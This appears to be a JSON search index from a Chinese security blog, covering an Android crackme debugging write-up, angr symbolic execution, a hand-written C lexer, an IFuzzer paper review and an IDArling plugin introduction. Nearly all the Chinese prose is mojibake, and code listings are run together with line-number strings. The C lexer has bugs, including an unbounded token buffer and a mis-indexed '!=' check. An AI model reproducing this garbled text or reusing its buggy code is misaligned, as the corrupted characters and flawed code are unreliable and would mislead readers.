r0,r0ä½œä¸ºNOPæŒ‡ä»¤ã€‚ä¿®æ”¹åä½¿ç”¨apktoolsæ‰“åŒ…å›å»ï¼Œå†ä½¿ç”¨ç­¾åå·¥å…·ç­¾åå°±å¥½äº†ã€‚å†æ¬¡å®‰è£…å·²ç»patchå¥½çš„apkï¼Œé‡å¤ä¹‹å‰è°ƒè¯•çš„æ­¥éª¤ï¼Œè¿™æ¬¡å¯¹Java_com_yaotong_crackme_MainActivity_securityCheckæ–¹æ³•ä¸‹æ–­ç‚¹ï¼Œå›åˆ°æ¨¡æ‹Ÿå™¨é‡Œéšä¾¿è¾“å…¥ç‚¹ä»€ä¹ˆï¼ŒæŒ‰ä¸‹è¾“å…¥å¯†ç æŒ‰é’®ï¼ŒIDAé‡Œå°±æ–­ä¸‹æ¥äº†ï¼Œå°±å¯ä»¥æ„‰å¿«çš„å•æ­¥è°ƒè¯•äº†ã€‚ åŒå¼€IDAå¯ä»¥è¾…åŠ©åˆ†æï¼Œè¿™ä¸ªåœ°æ–¹å°±æ˜¯åŠ å¯†çš„å­—ç¬¦ä¸²æ‰€åœ¨çš„åœ°å€ç‚¹è¿›å»ä¹‹åæŸ¥çœ‹ å†æŸ¥çœ‹è¿™ä¸ªåœ°å€aiyou,bucuooè¿™åº”è¯¥å°±æ˜¯flagäº† 0x04: ç¬¬ä¸€æ¬¡è°ƒè¯•nativeå±‚çš„ä¸œè¥¿ï¼Œè¿˜æ˜¯å­¦åˆ°äº†ä¸å°‘ï¼Œä¹Ÿé‡åˆ°äº†è¿™æ ·é‚£æ ·çš„å°é—®é¢˜ï¼Œä¸è¿‡è¿˜æ˜¯å®Œæˆäº†ã€‚ 0x05:å‚è€ƒå®‰å“åŠ¨æ€è°ƒè¯•ä¸ƒç§æ­¦å™¨ä¹‹å­”é›€ç¿ â€“ Ida Pro","link":"/2016/06/29/%E7%AC%AC%E4%B8%80%E4%B8%AAandroid-cm%E8%B0%83%E8%AF%95%E5%88%86%E6%9E%90/"},{"title":"ç®€å•çš„å°è¯•angr","text":"0x00:å‰è¨€ä¹‹å‰æ¥è§¦åˆ°äº†ç¬¦å·æ‰§è¡Œï¼Œå¯ä»¥ç”¨äºç¨‹åºçš„è‡ªåŠ¨åŒ–åˆ†æï¼Œæ„Ÿè§‰è¿˜æ˜¯æ¯”è¾ƒç¥å¥‡ï¼Œå·¥ä¸šä¸Šçš„å…·ä½“ç”¨æ³•ä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œä¸è¿‡åœ¨CTFä¸­è¿™ä¸ªä¸œè¥¿æ…¢æ…¢åœ¨æµè¡Œâ€¦ä»defcon 2016å°±å¯ä»¥çœ‹å‡º(æœ‰å¾ˆå¤šäººè§£reç”¨ç¬¦å·æ‰§è¡Œ)ã€‚å¸¸ç”¨çš„åº“æœ‰angrã€z3ï¼Œæˆ‘åªå°è¯•äº†angrã€‚ 0x01:å…³äºç¬¦å·æ‰§è¡Œä»¥ä¸‹æ¥è‡ªç»´åŸºç™¾ç§‘ï¼š 1ç¬¦å·æ‰§è¡Œ ï¼ˆSymbolic Executionï¼‰æ˜¯ä¸€ç§ç¨‹åºåˆ†ææŠ€æœ¯ã€‚å…¶å¯ä»¥é€šè¿‡åˆ†æç¨‹åºæ¥å¾—åˆ°è®©ç‰¹å®šä»£ç åŒºåŸŸæ‰§è¡Œçš„è¾“å…¥ã€‚ä½¿ç”¨ç¬¦å·æ‰§è¡Œåˆ†æä¸€ä¸ªç¨‹åºæ—¶ï¼Œè¯¥ç¨‹åºä¼šä½¿ç”¨ç¬¦å·å€¼ä½œä¸ºè¾“å…¥ï¼Œè€Œéä¸€èˆ¬æ‰§è¡Œç¨‹åºæ—¶ä½¿ç”¨çš„å…·ä½“å€¼ã€‚åœ¨è¾¾åˆ°ç›®æ ‡ä»£ç æ—¶ï¼Œåˆ†æå™¨å¯ä»¥å¾—åˆ°ç›¸åº”çš„è·¯å¾„çº¦æŸï¼Œç„¶åé€šè¿‡çº¦æŸæ±‚è§£å™¨æ¥å¾—åˆ°å¯ä»¥è§¦å‘ç›®æ ‡ä»£ç çš„å…·ä½“å€¼ã€‚[1]ç¬¦å·æ¨¡æ‹ŸæŠ€æœ¯ï¼ˆsymbolic simulationï¼‰åˆ™æŠŠç±»ä¼¼çš„æ€æƒ³ç”¨äºç¡¬ä»¶åˆ†æã€‚ç¬¦å·è®¡ç®—ï¼ˆSymbolic computationï¼‰åˆ™ç”¨äºæ•°å­¦è¡¨è¾¾å¼åˆ†æã€‚ è¿™ä¸ªä¸œè¥¿çš„è¯¦ç»†èµ„æ–™å¯ä»¥googleå¾—åˆ°ï¼Œgithubä¸Šä¹Ÿæœ‰ä¸€äº›ä»‹ç»å’Œdemoã€‚ 0x02:ç®€å•çš„ä½¿ç”¨å¯¹äºCTFä¸­çš„reé¢˜ç›®æ¥è¯´ï¼Œä¸€äº›æµç¨‹ç¹çï¼Œä»£ç é‡å¤§çš„é¢˜ç›®ç®€ç›´æ˜¯ä½“åŠ›æ´»ï¼Œåšçš„äººå¿ƒåŠ›äº¤ç˜â€¦ä¸¾ä¸ªç®€å•çš„ä¾‹å­ï¼Œä¹‹å‰å¬chxxè¡¨å“¥åˆ†äº«è¿‡ä¸€ç§ä»£ç æ··æ·†çš„æŠ€æœ¯å«æ§åˆ¶æµå¹³å¦åŒ–ï¼Œç”¨IDAæ‰“å¼€è§†å›¾ç®€ç›´æ˜¯å™©æ¢¦â€¦å¦‚æœæ˜¯é‚£ç§å¾ˆå¤æ‚çš„ï¼ŒçœŸçš„æ˜¯çˆ†ç‚¸ï¼Œè¿™é‡Œåªç”¨ä¸€ä¸ªå¾ˆç®€å•çš„æ–‡ä»¶æ¥æ¼”ç¤ºã€‚å…¶å®è¿™æ®µä»£ç æ²¡å¤šé•¿ï¼Œå‡ åè¡Œï¼Œåˆ¤æ–­çš„é€»è¾‘ä¹Ÿå¾ˆç®€å•ï¼Œä½†æ˜¯å°±æ˜¯åˆ©ç”¨å‡ ä¸ªå˜é‡åœ¨æ§åˆ¶ç¨‹åºæµç¨‹ï¼Œè·³æ¥è·³å»ï¼Œåˆ†æèµ·æ¥ååˆ†éº»çƒ¦ã€‚ å¦‚æœä½¿ç”¨ç¬¦å·æ‰§è¡Œå»è§£å†³å°±ä¼šä½¿é—®é¢˜å˜å¾—å¾ˆç®€å•è·‘ç¬¦å·æ‰§è¡Œçš„æœºå™¨é…ç½®è¦å¥½äº›ï¼Œè¿™ä¸ªä¸œè¥¿å¤ªåƒå†…å­˜äº†,ç¨‹åºçš„å¤æ‚åº¦å’Œä½ ä»£ç çº¦æŸæ¡ä»¶å†™çš„å¦‚ä½•ï¼Œå°†å†³å®šä½ èƒ½ä¸èƒ½è·‘å‡ºç»“æœï¼Œå› ä¸ºè¿™ä¸ªç¨‹åºå¾ˆç®€å•ï¼Œæ‰€ä»¥å¾ˆå¿«å°±è·‘å‡ºæ¥äº†ã€‚ å¤§æ¦‚ å‡ åç§’â€¦ 0x03:å…¶ä»–ä¸ªäººæ„Ÿè§‰ï¼Œangrçš„å®˜æ–¹æ–‡æ¡£è¿˜ä¸é”™ï¼Œç»“åˆæ–‡æ¡£å’Œå®˜æ–¹ç»™å‡ºçš„exampleåº”è¯¥å¯ä»¥å­¦ä¼šä½¿ç”¨è¿™ä¸ªåº“ã€‚ä½†æ˜¯ç¬¦å·æ‰§è¡Œä¹Ÿæ˜¯æœ‰å±€é™æ€§çš„ï¼Œä¸èƒ½ç›²ç›®åœ°å»è·‘(å¦‚æœä½ ä»¥ä¸ºéšä¾¿è®¾å®šfind å’Œ avoid å°±å¯ä»¥è·‘å‡ºç»“æœï¼Œé‚£å°±å¤ªnaiveäº†)æ ¹æ®ç¨‹åºè·å–è¾“å…¥çš„æ–¹å¼ä¸åŒï¼Œangræœ‰ä¸åŒçš„å¤„ç†ï¼Œè¿˜æœ‰ä¸€äº›ç­›é€‰åŠŸèƒ½ï¼Œè¿™éƒ¨åˆ†å°±å¯ä»¥çœ‹çœ‹æ–‡æ¡£å•¦ï¼Œéƒ½æ¯”è¾ƒå®¹æ˜“æ‡‚ã€‚ç ”ç©¶æ·±å…¥çš„è¯ï¼Œè¿™ä¸ªä¸œè¥¿è¿˜æ˜¯å¾ˆå¤æ‚çš„ï¼Œæˆ‘ç°åœ¨åªæƒ³ä¼šä½¿ç”¨è¿™ä¸ªå·¥å…·å°±å¥½ï¼Œè¿˜æœ‰å¾ˆå¤šè¦å­¦TATã€‚ 0x04:æœ€è¿‘å‘ç°ä¸€ä¸ªå…¶ä»–çš„ç”¨é€”ï¼Œåœ¨åˆ†æpwnç±»å‹é¢˜ç›®çš„äºŒè¿›åˆ¶æ–‡ä»¶çš„æ—¶å€™ï¼Œé€‚å½“çš„ä½¿ç”¨angræ¥æµ‹è¯•ä¸€äº›æ‰§è¡Œè·¯å¾„ä¹Ÿæ˜¯å¯ä»¥çš„â€¦ä¸è¿‡è¿˜æ˜¯ä¸èƒ½å¤ªä¾èµ–ï¼Œæ›´å¤šçš„æ—¶å€™è¿˜æ˜¯è¦äººè‚‰åˆ†æ+è°ƒè¯•ã€‚","link":"/2016/08/01/%E7%AE%80%E5%8D%95%E7%9A%84%E5%B0%9D%E8%AF%95angr/"},{"title":"ç¼–è¯‘åŸç†å­¦ä¹ ","text":"0x00: å…³äºç¼–è¯‘åŸç†ç¨‹åºå‘˜çš„ä¸‰å¤§æµªæ¼«ä¹‹ä¸€ï¼ŒäºŒè¿›åˆ¶é€‰æ‰‹å¿…ä¿®è¯¾ã€‚æ‰€ä»¥æ¯…ç„¶å†³ç„¶å¼€å‘äº†ï¼Œå¼€å§‹çœ‹ç½‘æ˜“äº‘è¯¾å ‚çš„moocï¼Œä¹Ÿçœ‹äº†Courseraä¸Šçš„Compilersè¯¾ç¨‹ï¼Œæ„Ÿè§‰åè€…æ›´å¥½ä¸€ç‚¹ï¼Œå°±æ˜¯çœ‹èµ·æ¥å¾ˆè´¹åŠ›ã€‚ä¹¦çš„è¯è¿˜æ²¡æ‰¾åˆ°åˆé€‚çš„ï¼Œå€’æ˜¯æœ‰å‡ æœ¬å‚è€ƒï¼š é¾™ä¹¦ è™ä¹¦ å›¾è§£ç¼–è¯‘åŸç† è‡ªåˆ¶ç¼–è¯‘å™¨ ä½†æ˜¯ä¸ªäººå¹¶ä¸æ˜¯å¾ˆæ¸…æ¥šå¦‚ä½•é€‰æ‹©ï¼Œæˆ‘çš„æ–¹æ³•æ˜¯çœ‹ä¹¦+çœ‹moocï¼Œç„¶åå†™ä»£ç å®è·µï¼Œæœ¬æ¥è¿™å°±æ˜¯ä¸€é—¨ç†è®º+å®è·µçš„è¯¾ç¨‹ã€‚ 0x01:è¿‡ç¨‹ è¯æ³•åˆ†æï¼ˆprogram text åˆ†å‰²æˆ words æˆ–è€… tokensï¼‰ è§£æï¼ˆè¯­æ³•æ ‘ï¼‰ è¯­æ³•åˆ†æï¼ˆç†è§£â€œå«ä¹‰â€ï¼‰ ä¸­é—´ä¼˜åŒ–ï¼ˆlittle bit like editingï¼Œä½œæ–‡çš„æ¶¦è‰²ï¼Ÿä¸ºäº†è¿è¡Œçš„æ›´å¿«ã€ä½¿ç”¨æ›´å°‘çš„å†…å­˜ç­‰ï¼‰ ä»£ç ç”Ÿæˆ ï¼ˆassembly codeï¼‰ 0x02: ç®€å•çš„è¯æ³•åˆ†æå™¨1. å®šä¹‰ï¼šè¯æ³•åˆ†æå™¨çš„åŠŸèƒ½è¾“å…¥æºç¨‹åºï¼ŒæŒ‰ç…§æ„è¯è§„åˆ™åˆ†è§£æˆä¸€ç³»åˆ—å•è¯ç¬¦å·ã€‚å•è¯æ˜¯è¯­è¨€ä¸­å…·æœ‰ç‹¬ç«‹æ„ä¹‰çš„æœ€å°å•ä½ï¼ŒåŒ…æ‹¬å…³é”®å­—ã€æ ‡è¯†ç¬¦ã€è¿ç®—ç¬¦ã€ç•Œç¬¦å’Œå¸¸é‡ç­‰(1) å…³é”®å­— æ˜¯ç”±ç¨‹åºè¯­è¨€å®šä¹‰çš„å…·æœ‰å›ºå®šæ„ä¹‰çš„æ ‡è¯†ç¬¦ã€‚ä¾‹å¦‚ï¼ŒPascal ä¸­çš„beginï¼Œendï¼Œifï¼Œwhileéƒ½æ˜¯ä¿ç•™å­—ã€‚è¿™äº›å­—é€šå¸¸ä¸ç”¨ä½œä¸€èˆ¬æ ‡è¯†ç¬¦ã€‚(2) æ ‡è¯†ç¬¦ ç”¨æ¥è¡¨ç¤ºå„ç§åå­—ï¼Œå¦‚å˜é‡åï¼Œæ•°ç»„åï¼Œè¿‡ç¨‹åç­‰ç­‰ã€‚(3) å¸¸æ•° å¸¸æ•°çš„ç±»å‹ä¸€èˆ¬æœ‰æ•´å‹ã€å®å‹ã€å¸ƒå°”å‹ã€æ–‡å­—å‹ç­‰ã€‚(4) è¿ç®—ç¬¦ å¦‚+ã€-ã€*ã€/ç­‰ç­‰ã€‚(5) ç•Œç¬¦ å¦‚é€—å·ã€åˆ†å·ã€æ‹¬å·ã€ç­‰ç­‰ã€‚ 2. è¾“å‡ºï¼šè¯æ³•åˆ†æå™¨æ‰€è¾“å‡ºå•è¯ç¬¦å·å¸¸å¸¸è¡¨ç¤ºæˆå¦‚ä¸‹çš„äºŒå…ƒå¼ï¼š (å•è¯ç§åˆ«ï¼Œå•è¯ç¬¦å·çš„å±æ€§å€¼) å•è¯ç§åˆ«é€šå¸¸ç”¨æ•´æ•°ç¼–ç ã€‚æ ‡è¯†ç¬¦ä¸€èˆ¬ç»Ÿå½’ä¸ºä¸€ç§ã€‚å¸¸æ•°åˆ™å®œæŒ‰ç±»å‹ï¼ˆæ•´ã€å®ã€å¸ƒå°”ç­‰ï¼‰åˆ†ç§ã€‚å…³é”®å­—å¯å°†å…¶å…¨ä½“è§†ä¸ºä¸€ç§ã€‚è¿ç®—ç¬¦å¯é‡‡ç”¨ä¸€ç¬¦ä¸€ç§çš„æ–¹æ³•ã€‚ç•Œç¬¦ä¸€èˆ¬ç”¨ä¸€ç¬¦ä¸€ç§çš„æ–¹æ³•ã€‚å¯¹äºæ¯ä¸ªå•è¯ç¬¦å·ï¼Œé™¤äº†ç»™å‡ºäº†ç§åˆ«ç¼–ç ä¹‹å¤–ï¼Œè¿˜åº”ç»™å‡ºæœ‰å…³å•è¯ç¬¦å·çš„å±æ€§ä¿¡æ¯ã€‚å•è¯ç¬¦å·çš„å±æ€§æ˜¯æŒ‡å•è¯ç¬¦å·çš„ç‰¹æ€§æˆ–ç‰¹å¾ã€‚ 3. ç¤ºä¾‹ï¼šæ¯”å¦‚å¦‚ä¸‹çš„ä»£ç æ®µï¼š 1if (a&gt;b) print a ç»è¯æ³•åˆ†æå™¨å¤„ç†åï¼Œå®ƒå°†è¢«è½¬ä¸ºå¦‚ä¸‹çš„å•è¯ç¬¦å·åºåˆ—ï¼š 12345678 &lt;keywords,if&gt;&lt;symbol,(&gt;&lt;symbol,&gt;&gt;&lt;symbol,)&gt;&lt;whitespace, &gt;&lt;keywords,print&gt;&lt;whitespace, &gt;&lt;whitespace,\\n&gt; 4. æˆ‘çš„å®ç°å¾ˆç®€å•ï¼Œé€ä¸ªå­—ç¬¦æ‰«æçš„æ–¹å¼ï¼Œé€‰æ‹©æ¡ä»¶ç»“æ„æ¥è§£æè¾“å…¥ï¼Œå¹¶å½’ç±»ç”Ÿæˆå¯¹åº”çš„äºŒå…ƒå¼ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;#define SYN_SYMBOL 0x000#define SYN_KEYWORDS 0x100#define SYN_NUMBERS 0x101#define SYN_WHITESPS 0x111#define MAX_CLASS 0x100char *keywords[6] = {&quot;if&quot;,&quot;else&quot;,&quot;do&quot;,&quot;while&quot;,&quot;then&quot;,&quot;print&quot;};struct CLASS{ int syn; char str[6]; int sum;};struct CLASS* CLASS_ARRARY[MAX_CLASS];void save(char *token){ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_SYMBOL; strncpy(cla-&gt;str,token,strlen(token)&lt;6?strlen(token):6); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } }}void scaner(char *userinput){ char temp; int idx = 0; char token[6] = {0}; do{ temp = userinput[idx++]; if((temp &gt;= 'a' &amp;&amp; temp &lt;= 'z' ) || (temp &gt;= 'A' &amp;&amp; temp &lt;= 'Z')){ //key words int m = 0; int n = idx; while((temp &gt;= 'a' &amp;&amp; temp &lt;= 'z' ) || (temp &gt;= 'A' &amp;&amp; temp &lt;= 'Z') || (temp &gt;= '0' &amp;&amp; temp &lt;= '9')){ token[m++] = temp; temp = userinput[n++]; } //key word scan done token[m++] = '\\0'; for(int i = 0;i&lt;6;i++){ if(!strcmp(token,keywords[i])){ //find it struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_KEYWORDS; strncpy(cla-&gt;str,token,6); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i]= cla; break; } } break; } } }else if(temp &gt;= '0' &amp;&amp; temp &lt;= '9'){ //numbers int m = 0; int n = idx; int sum = 0; while((temp &gt;= '0' &amp;&amp; temp &lt;= '9')){ sum=sum*10 + temp - '0'; temp = userinput[n++]; } struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_NUMBERS; cla-&gt;sum = sum; for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; idx = n; break; } } }else { //other chars switch(temp){ case '&gt;':{ token[0] = temp; char tmp = userinput[idx]; if(tmp == '='){ token[1] = tmp; idx ++; } save(token); } break; case '&lt;':{ token[0] = temp; char tmp = userinput[idx]; if(tmp == '=') { token[1] = tmp; idx++; } save(token); } break; case '=':{ token[0] = temp; char tmp = userinput[idx]; if(tmp == '=') { token[1] = tmp; idx++; } save(token); } break; case ';': token[0] = ';'; save(token); break; case '!':{ token[0] = temp; char tmp = userinput[idx+1]; if(tmp == '=') token[1] = tmp; save(token); } break; case '+': token[0] = temp; save(token); break; case '-': token[0] = temp; save(token); break; case '*': token[0] = temp; save(token); break; case '/': token[0] = temp; save(token); break; case '\\\\': token[0] = temp; save(token); break; case '(': token[0] = temp; save(token); break; case ')': token[0] = temp; save(token); break; case '\\n':{ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_WHITESPS; strncpy(cla-&gt;str,&quot;\\\\n&quot;,2); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } } } break; case '\\t':{ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_WHITESPS; strncpy(cla-&gt;str,&quot;\\\\t&quot;,2); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } } } break; case ' ':{ struct CLASS* cla = (struct CLASS*)malloc(sizeof(struct CLASS)); cla-&gt;syn = SYN_WHITESPS; strncpy(cla-&gt;str,&quot; &quot;,2); for(int i = 0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i] == NULL){ CLASS_ARRARY[i] = cla; break; } } } break; case '#': //end break; default: printf(&quot;unknown:%c\\n&quot;,temp); break; } } }while(temp != '#');}int main() { char userinput[100] = {0}; int flag = 0; char temp; printf(&quot;Plz input your string:&quot;); do{ temp = getchar(); userinput[flag++] = temp; }while(temp != '#'); scaner(userinput); for(int i=0;i&lt;MAX_CLASS;i++){ if(CLASS_ARRARY[i]){ switch(CLASS_ARRARY[i]-&gt;syn){ case SYN_NUMBERS: printf(&quot;&lt;numbers,%d&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;sum); break; case SYN_KEYWORDS: printf(&quot;&lt;keywords,%s&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;str); break; case SYN_WHITESPS: printf(&quot;&lt;whitespace,%s&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;str); break; case SYN_SYMBOL: printf(&quot;&lt;symbol,%s&gt;\\n&quot;,CLASS_ARRARY[i]-&gt;str); break; } }else{ break; } } printf(&quot;Done.\\n&quot;); return 0;} 5. æ•ˆæœ1234567891011Plz input your string:if(a&gt;b) print a#&lt;keywords,if&gt;&lt;symbol,(&gt;&lt;symbol,&gt;&gt;&lt;symbol,)&gt;&lt;whitespace, &gt;&lt;keywords,print&gt;&lt;whitespace, &gt;&lt;whitespace,\\n&gt;Done. 6. æ›´å¥½çš„å®ç°ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ï¼Œå¾…è¡¥å……ã€‚ 0x03: å¾…å­¦ä¹ å†…å®¹ è¯æ³•åˆ†æï¼ˆåˆ©ç”¨æ­£åˆ™çš„è¯æ³•åˆ†æå™¨ï¼‰ è¯­æ³•åˆ†æ ä¸­é—´ä¼˜åŒ– ä»£ç ç”Ÿæˆ å¼€äº†ä¸ªå‘ï¼Œæ…¢æ…¢å¡«å§ã€‚ 0x04: å‚è€ƒå†…å®¹è¯æ³•åˆ†æå™¨çš„å®ç°","link":"/2017/06/30/%E7%BC%96%E8%AF%91%E5%8E%9F%E7%90%86%E5%AD%A6%E4%B9%A0/"},{"title":"è®ºæ–‡é˜…è¯»&lt;IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming&gt;","text":"0x00:å…³äºæœ€è¿‘åœ¨é˜…è¯»ä¸€äº›æ¼æ´æŒ–æ˜ç›¸å…³æŠ€æœ¯çš„è®ºæ–‡ï¼Œæ­£å¥½è¯»åˆ°è¿™ç¯‡ï¼Œåšä¸ªè®°å½•ã€‚è¿™ç¯‡è®ºæ–‡æ˜¯IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programmingã€‚ä¸»è¦æ˜¯ä»‹ç»IFuzzerçš„ä¸€ç¯‡è®ºæ–‡ï¼Œä¸»è¦æ˜¯åˆ©ç”¨antlr4+é—ä¼ ç®—æ³•æjs fuzzã€‚ 0x01:è®ºæ–‡é˜…è¯»è¯¥è®ºæ–‡ä¸»è¦æ˜¯é’ˆå¯¹è„šæœ¬å¼•æ“çš„fuzzï¼Œåªæ˜¯æ–‡ä¸­ä½¿ç”¨äº†js engineä½œä¸ºç›®æ ‡ã€‚ æ ¸å¿ƒæ€æƒ³å°±æ˜¯ï¼šæ”¶é›†å¤§é‡çš„æµ‹è¯•ä»£ç ï¼Œä½¿ç”¨antlr4ç¼–å†™å¥½çš„è¯­æ³•è§£æå™¨è§£æå‡ºéç»ˆç»“ç¬¦ç‰‡æ®µï¼ŒæŠŠè¾“å…¥è§£ææˆASTåï¼Œåœ¨ASTä¸Šè¿›è¡Œå˜å¼‚ã€‚ å˜å¼‚çš„æ–¹å¼ä¸»è¦æ˜¯åˆ©ç”¨æ”¶é›†çš„â€œç‰‡æ®µâ€å»æ›¿æ¢è§£ææ ‘ä¸­ç›¸åŒéç»ˆç»“ç¬¦ï¼Œç”±äºé‡‡ç”¨äº†é—ä¼ ç®—æ³•ï¼Œé€šè¿‡å¯¹æ¯ä¸ªä¸ªä½“çš„è¯„ä¼°ï¼Œç­›é€‰ä¼˜ç§€çš„ä¸ªä½“è¿›è¡Œâ€œæ‚äº¤â€äº§ç”Ÿæ–°çš„ä¸ªä½“è¿›å…¥ä¸‹ä¸€è½®fuzzï¼Œâ€œæ‚äº¤â€çš„æ–¹æ³•æ˜¯äº¤æ¢ä¸¤ä¸ªä¸ªä½“ä¸­ç›¸åŒçš„éç»ˆç»“ç¬¦èŠ‚ç‚¹ï¼Œäº§ç”Ÿä¸¤æ£µæ–°çš„è¾“ã€‚ é‡‡ç”¨é—ä¼ ç®—æ³•å¿…é¡»é¢å¯¹è†¨èƒ€æ§åˆ¶çš„é—®é¢˜ã€‚è¿™é‡Œè®ºæ–‡ä½œè€…å¯¹æ¯ä¸ªä¸ªä½“è¯„ä¼°æ—¶ï¼Œé‡‡ç”¨äº†å¦‚ä¸‹çš„å…¬å¼ï¼š 12fb(x) = score_structure + score_feedbackffinal(x) = fb(x) âˆ’ c âˆ— (l(x)) å³ï¼š åŸºç¡€å¾—åˆ†=ç»“æ„å¾—åˆ†+(è§£é‡Šå™¨)å›é¦ˆå¾—åˆ†æœ€ç»ˆå¾—åˆ†=åŸºç¡€çš„åˆ†-è†¨èƒ€æ§åˆ¶ è¿™æ ·çš„è¯çš„ç¡®æœ‰æ•ˆçš„æ§åˆ¶äº†é—ä¼ ç®—æ³•åœ¨è¿­ä»£ä¸­çš„è†¨èƒ€é—®é¢˜ã€‚ è®ºæ–‡ä¸­æµ‹è¯•éƒ¨åˆ†æ²¡ä»”ç»†çœ‹ï¼Œæˆ‘åªå…³æ³¨äº†æ ¸å¿ƒçš„ç®—æ³•å’Œä¸€äº›é—®é¢˜çš„è§£å†³ï¼Œå‰©ä¸‹çš„å·¥ä½œå°±æ˜¯å»é˜…è¯»IFuzzerä»£ç å»ä½“ä¼šäº†ã€‚ 0x02:ä¸ªäººæƒ³æ³•é¦–å…ˆæ„Ÿè§‰è¿™ä¸ªä¸œè¥¿æ²¡é‚£ä¹ˆå®Œå–„ï¼Œæˆ–è€…è¯´æ²¡æ”¾å…¨ã€‚ å˜å¼‚çš„ç­–ç•¥å…¶å®å¯ä»¥æ›´å¤šçš„ï¼Œè¿™ç§æ›¿æ¢çš„æ–¹å¼æ„Ÿè§‰è¿˜æ˜¯æœ‰å±€é™æ€§ï¼Œå…¶å®å°±æ˜¯ç±»ä¼¼äºç”¨ä¸€å¤§å †ç§¯æœ¨ï¼Œå»ç»„åˆï¼Œæ˜¯ä»ç°æœ‰çš„ä¸œè¥¿ç”Ÿæˆä¸€äº›ç»„åˆæ€§çš„ä¸œè¥¿ï¼›å¦‚æœå¯ä»¥åŠ å…¥åˆ›é€ æ€§çš„ä¸œè¥¿å°±å¥½äº†ï¼Œæ¯”å¦‚ç§¯æœ¨çš„å½¢çŠ¶ã€æè´¨æ”¹å˜ï¼Œç„¶åå»åˆ›é€ æ–°çš„ç»„åˆã€‚ è®°å¾—å‡ ä¸ªæœˆå‰çœ‹è¿‡éŸ©å›½ä¸€ä¸ªå¤§ä½¬ï¼ˆBoBè®¡åˆ’çš„å¯¼å¸ˆï¼‰çš„slideï¼Œä»–åšçš„ç±»ä¼¼çš„äº‹æƒ…ï¼Œä½†æ˜¯ä¸ä¸€æ ·çš„æ˜¯ï¼šä»–æŠŠæ”¶é›†çš„æµ‹è¯•ä»£ç ã€pocè§£æååˆ°ASTç„¶ååˆ°IRï¼Œç›´æ¥åœ¨IRä¸Šæ“ä½œï¼Œä¹‹åä»IRå†ç”Ÿæˆjsä»£ç ï¼Œæ•ˆæœä¹Ÿä¸é”™ï¼Œä½†æ˜¯é‚£ä¸ªæ²¡æ”¾å‡ºæºç æ‰€ä»¥ä¹Ÿä¸å¥½ä¸IFuzzeræ¯”è¾ƒã€‚ ä»èº«è¾¹çš„å¤§ä½¬çš„è¯´æ³•æ¥çœ‹ï¼ŒIFuzzerå¾ˆæœ‰é™ï¼Œéœ€è¦æ”¹è¿›çš„åœ°æ–¹å¾ˆå¤š- ã€‚- ä¸è¿‡æˆ‘ä¸ªäººè®¤ä¸ºï¼Œè¿™æ ·çš„æ€è·¯å€¼å¾—å€Ÿé‰´ï¼Œè™½ç„¶å¾ˆå¥½æƒ³ï¼Œä½†æ˜¯éš¾åšå•Šã€‚ã€‚å»å¹´å°±æƒ³è¿™ä¹ˆæäº†ï¼Œç„¶è€Œä¸€äº›åŸºç¡€çŸ¥è¯†è·Ÿä¸ä¸Šï¼Œç°å¦‚ä»Šå¯ä»¥è¯•ä¸€è¯•å•¦ï½ 0x03:å¼•ç”¨IFuzzer: An Evolutionary Interpreter Fuzzer using Genetic Programming","link":"/2018/06/09/%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB-IFuzzer-An-Evolutionary-Interpreter-Fuzzer-using-Genetic-Programming/"},{"title":"é€†å‘åä½œä¹‹IDAæ’ä»¶IDArling","text":"0x00 : ä»‹ç»IDArlingæ˜¯ä¸€ä¸ªé€†å‘åä½œæ’ä»¶ï¼Œå°†IDAä½¿ç”¨è¿‡ç¨‹ä¸­äº§ç”Ÿçš„æ•°æ®æ–‡ä»¶æ”¾åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¹¶ä¸”å¯ä»¥è‡ªåŠ¨åŒæ­¥ï¼Œé€‚åˆå¤šäººåä½œä½¿ç”¨ï¼Œæ¯”å¦‚CTFæ¯”èµ›ã€å·¥ä½œä¸­çš„é¡¹ç›®ï¼›ä¹Ÿé€‚åˆä¸ªäººä½¿ç”¨ï¼Œæ¯”å¦‚åœ¨å…¬å¸çš„å·¥ä½œå†…å®¹åŒæ­¥åˆ°è‡ªå·±çš„æœåŠ¡å™¨ä¸Šï¼Œå›å®¶ä¹‹åç”¨å®¶é‡Œçš„ç”µè„‘æ–¹ä¾¿æŸ¥çœ‹å’Œä½¿ç”¨ã€‚ 